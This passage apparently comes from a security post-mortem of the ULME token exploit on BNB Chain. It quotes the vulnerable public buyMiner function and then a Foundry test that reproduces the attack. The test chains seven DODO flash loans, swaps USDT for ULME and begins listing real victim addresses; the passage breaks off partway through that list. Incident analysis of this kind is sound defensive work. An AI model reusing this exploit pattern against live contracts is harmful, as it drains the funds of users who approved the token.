+<p>Now, let's analyze the vulnerable <a href="https://bscscan.com/address/0xAE975a25646E6eB859615d0A147B909c13D31FEd#code">ULME contract</a>.</p>
+<p>From the analysis of the attack transaction, it is clear that the vulnerability lies in the <code>buyMiner</code> function of the contract.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">buyMiner</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">user</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">usdt</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">    </span><span class="kt">address</span><span class="p">[]</span><span class="w"> </span><span class="kt">memory</span><span class="w"> </span>token<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">address</span><span class="p">[](</span><span class="m m-Decimal">2</span><span class="p">);</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span>token<span class="p">[</span><span class="m m-Decimal">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_usdt_token<span class="p">;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span>token<span class="p">[</span><span class="m m-Decimal">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">);</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span>usdt<span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>add<span class="p">(</span>usdt<span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">10</span><span class="p">));</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>IERC20<span class="p">(</span>_usdt_token<span class="p">).</span>transferFrom<span class="p">(</span>user<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>usdt<span class="p">),</span><span class="w"> </span><span class="s2">&quot;buyUlm: transferFrom to ulm error&quot;</span><span class="p">);</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">time</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>sale_date<span class="p">;</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">    </span>sale_date<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x25812c28CBC971F7079879a62AaCBC93936784A2</span><span class="p">;</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">    </span>IUniswapV2Router01<span class="p">(</span>_roter<span class="p">).</span>swapExactTokensForTokens<span class="p">(</span>usdt<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">1000000</span><span class="p">,</span><span class="w"> </span>token<span class="p">,</span><span class="w"> </span>k<span class="p">,</span><span class="w"> </span><span class="k">block.timestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m m-Decimal">60</span><span class="p">);</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">    </span>IUniswapV2Router01<span class="p">(</span>k<span class="p">).</span>transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>IERC20<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)).</span>balanceOf<span class="p">(</span>k<span class="p">));</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">    </span>sale_date<span class="w"> </span><span class="o">=</span><span class="w"> </span>time<span class="p">;</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="w">    </span><span class="kt">return</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>As observed earlier, this function first calls <code>transferFrom</code> to transfer USDT from the <code>user</code> address to this contract (with an amount of <code>1.1*usdt</code>) and then proceeds with the ULME exchange and transfer operations. The visibility of this function is <code>public</code>, enabling anyone to exploit it.</p>
+<h2 id="exploit">Exploit</h2>
+<h3 id="reproduce">Reproduce</h3>
+<p>To reproduce the exploit based on AttackTx, the following code can be used.</p>
+<div class="language-solidity highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testExploit</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">attackBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">22476695</span><span class="p">;</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">    </span>vm<span class="p">.</span>rollFork<span class="p">(</span>attackBlockNumber<span class="p">);</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">startBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Initial attacker USDT&quot;</span><span class="p">,</span><span class="w"> </span>startBalance<span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">dodo1USDT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span>dodo1<span class="p">);</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">    </span><span class="c1">// start flashloan</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="w">    </span>IDVM<span class="p">(</span>dodo1<span class="p">).</span>flashLoan<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>dodo1USDT<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>abi<span class="p">.</span>encode<span class="p">(</span><span class="s2">&quot;dodo1&quot;</span><span class="p">));</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">    </span><span class="c1">// attack end</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">endBalance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Total profit USDT&quot;</span><span class="p">,</span><span class="w"> </span>endBalance<span class="w"> </span><span class="o">-</span><span class="w"> </span>startBalance<span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="p">}</span>
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="kt">function</span><span class="w"> </span><span class="nv">dodoCall</span><span class="p">(</span><span class="kt">address</span><span class="p">,</span><span class="w"> </span><span class="cm">/*sender*/</span><span class="w"> </span><span class="kt">uint256</span><span class="p">,</span><span class="w"> </span><span class="cm">/*baseAmount*/</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">quoteAmount</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">calldata</span><span class="w"> </span><span class="cm">/*data*/</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="w">    </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>dodo1<span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">dodo2USDT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span>dodo2<span class="p">);</span>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="w">        </span>IDPPAdvanced<span class="p">(</span>dodo2<span class="p">).</span>flashLoan<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>dodo2USDT<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>abi<span class="p">.</span>encode<span class="p">(</span><span class="s2">&quot;dodo2&quot;</span><span class="p">));</span>
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="w">        </span>usdt<span class="p">.</span>transfer<span class="p">(</span>dodo1<span class="p">,</span><span class="w"> </span>quoteAmount<span class="p">);</span>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>dodo2<span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">dodo3USDT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span>dodo3<span class="p">);</span>
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="w">        </span>IDPPOracle<span class="p">(</span>dodo3<span class="p">).</span>flashLoan<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>dodo3USDT<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>abi<span class="p">.</span>encode<span class="p">(</span><span class="s2">&quot;dodo3&quot;</span><span class="p">));</span>
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="w">        </span>usdt<span class="p">.</span>transfer<span class="p">(</span>dodo2<span class="p">,</span><span class="w"> </span>quoteAmount<span class="p">);</span>
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>dodo3<span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">dodo4USDT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span>dodo4<span class="p">);</span>
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a><span class="w">        </span>IDPP<span class="p">(</span>dodo4<span class="p">).</span>flashLoan<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>dodo4USDT<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>abi<span class="p">.</span>encode<span class="p">(</span><span class="s2">&quot;dodo4&quot;</span><span class="p">));</span>
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="w">        </span>usdt<span class="p">.</span>transfer<span class="p">(</span>dodo3<span class="p">,</span><span class="w"> </span>quoteAmount<span class="p">);</span>
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>dodo4<span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">dodo5USDT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span>dodo5<span class="p">);</span>
+</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a><span class="w">        </span>IDPPAdvanced<span class="p">(</span>dodo5<span class="p">).</span>flashLoan<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>dodo5USDT<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>abi<span class="p">.</span>encode<span class="p">(</span><span class="s2">&quot;dodo5&quot;</span><span class="p">));</span>
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a><span class="w">        </span>usdt<span class="p">.</span>transfer<span class="p">(</span>dodo4<span class="p">,</span><span class="w"> </span>quoteAmount<span class="p">);</span>
+</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>dodo5<span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">dodo6USDT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span>dodo6<span class="p">);</span>
+</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a><span class="w">        </span>IDPPOracle<span class="p">(</span>dodo6<span class="p">).</span>flashLoan<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>dodo6USDT<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>abi<span class="p">.</span>encode<span class="p">(</span><span class="s2">&quot;dodo6&quot;</span><span class="p">));</span>
+</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a><span class="w">        </span>usdt<span class="p">.</span>transfer<span class="p">(</span>dodo5<span class="p">,</span><span class="w"> </span>quoteAmount<span class="p">);</span>
+</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>dodo6<span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a><span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">dodo7USDT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span>dodo7<span class="p">);</span>
+</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a><span class="w">        </span>IDPPOracle<span class="p">(</span>dodo7<span class="p">).</span>flashLoan<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>dodo7USDT<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span>abi<span class="p">.</span>encode<span class="p">(</span><span class="s2">&quot;dodo7&quot;</span><span class="p">));</span>
+</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a><span class="w">        </span>usdt<span class="p">.</span>transfer<span class="p">(</span>dodo6<span class="p">,</span><span class="w"> </span>quoteAmount<span class="p">);</span>
+</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="kt">else</span><span class="w"> </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>dodo7<span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a><span class="w">        </span><span class="c1">// flashloan end, start attack</span>
+</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a><span class="w">        </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Total borrowed USDT&quot;</span><span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)),</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a>
+</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a><span class="w">        </span><span class="c1">// approve before swap</span>
+</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a><span class="w">        </span>usdt<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>pancakeRouter<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint256</span><span class="p">).</span>max<span class="p">);</span>
+</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a><span class="w">        </span>ulme<span class="p">.</span>approve<span class="p">(</span><span class="kt">address</span><span class="p">(</span>pancakeRouter<span class="p">),</span><span class="w"> </span>type<span class="p">(</span><span class="kt">uint256</span><span class="p">).</span>max<span class="p">);</span>
+</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a><span class="w">        </span>USDT2ULME<span class="p">();</span>
+</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a><span class="w">        </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Total exchanged ULME&quot;</span><span class="p">,</span><span class="w"> </span>ulme<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)),</span><span class="w"> </span>ulme<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a>
+</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a><span class="w">        </span><span class="kt">address</span><span class="p">[]</span><span class="w"> </span><span class="kt">memory</span><span class="w"> </span>victims<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">new</span><span class="w"> </span><span class="kt">address</span><span class="p">[](</span><span class="m m-Decimal">101</span><span class="p">);</span>
+</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x4A005e5E40Ce2B827C873cA37af77e6873e37203</span><span class="p">;</span>
+</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x5eCe8A3382FD5317EBa6670cAe2F70ccA8845859</span><span class="p">;</span>
+</span><span id="__span-1-54"><a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x065D5Bfb0bdeAdA1637974F76AcF54428D61c45d</span><span class="p">;</span>
+</span><span id="__span-1-55"><a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">3</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0C678244aaEd33b6c963C2D6B14950d35EAB899F</span><span class="p">;</span>
+</span><span id="__span-1-56"><a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">4</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x1F0D9584bC8729Ec139ED5Befe0c8677994FcB35</span><span class="p">;</span>
+</span><span id="__span-1-57"><a id="__codelineno-1-57" name="__codelineno-1-57" href="#__codelineno-1-57"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">5</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x6b8cdC12e9E2F5b3620FfB12c04C5e7b0990aaf2</span><span class="p">;</span>
+</span><span id="__span-1-58"><a id="__codelineno-1-58" name="__codelineno-1-58" href="#__codelineno-1-58"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">6</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xA9882080e01F8FD11fa85F05f7c7733D1C9837DF</span><span class="p">;</span>
+</span><span id="__span-1-59"><a id="__codelineno-1-59" name="__codelineno-1-59" href="#__codelineno-1-59"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">7</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x1dFBBECc9304f73caD14C3785f25C1d1924ACB0B</span><span class="p">;</span>
+</span><span id="__span-1-60"><a id="__codelineno-1-60" name="__codelineno-1-60" href="#__codelineno-1-60"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">8</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0b038F3e5454aa745Ff029706656Fed638d5F73a</span><span class="p">;</span>
+</span><span id="__span-1-61"><a id="__codelineno-1-61" name="__codelineno-1-61" href="#__codelineno-1-61"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">9</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0Bd084decfb04237E489cAD4c8A559FC5ce44f90</span><span class="p">;</span>
+</span><span id="__span-1-62"><a id="__codelineno-1-62" name="__codelineno-1-62" href="#__codelineno-1-62"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">10</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x5EB2e4907f796C9879181041fF633F33f8858d93</span><span class="p">;</span>
+</span><span id="__span-1-63"><a id="__codelineno-1-63" name="__codelineno-1-63" href="#__codelineno-1-63"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">11</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0DE272Ef3273d49Eb608296A783dBd36488d3989</span><span class="p">;</span>
+</span><span id="__span-1-64"><a id="__codelineno-1-64" name="__codelineno-1-64" href="#__codelineno-1-64"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">12</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xAe800360ac329ceA761AFDa2d3D55Bd12932Ab62</span><span class="p">;</span>
+</span><span id="__span-1-65"><a id="__codelineno-1-65" name="__codelineno-1-65" href="#__codelineno-1-65"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">13</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xf7726cA96bF1Cee9c6dC568ad3A801E637d10076</span><span class="p">;</span>
+</span><span id="__span-1-66"><a id="__codelineno-1-66" name="__codelineno-1-66" href="#__codelineno-1-66"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">14</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x847aA967534C31b47d46A2eEf5832313E36b25E2</span><span class="p">;</span>
+</span><span id="__span-1-67"><a id="__codelineno-1-67" name="__codelineno-1-67" href="#__codelineno-1-67"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">15</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x6c91DA0Dc1e8ab02Ab1aB8871c5aE312ef04273b</span><span class="p">;</span>
+</span><span id="__span-1-68"><a id="__codelineno-1-68" name="__codelineno-1-68" href="#__codelineno-1-68"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">16</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xb14018024600eE3c747Be98845c8536994D40A5D</span><span class="p">;</span>
+</span><span id="__span-1-69"><a id="__codelineno-1-69" name="__codelineno-1-69" href="#__codelineno-1-69"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">17</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x8EcdD8859aA286c6bae1f570eb0105457fD24cd2</span><span class="p">;</span>
+</span><span id="__span-1-70"><a id="__codelineno-1-70" name="__codelineno-1-70" href="#__codelineno-1-70"></a><span class="w">        </span>victims<span class="p">[</span><span class="m m-Decimal">18</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x6ff1c499C13548ee5C9B1EA6d366A5E11EcA60ca</span><span class="p">;</span>
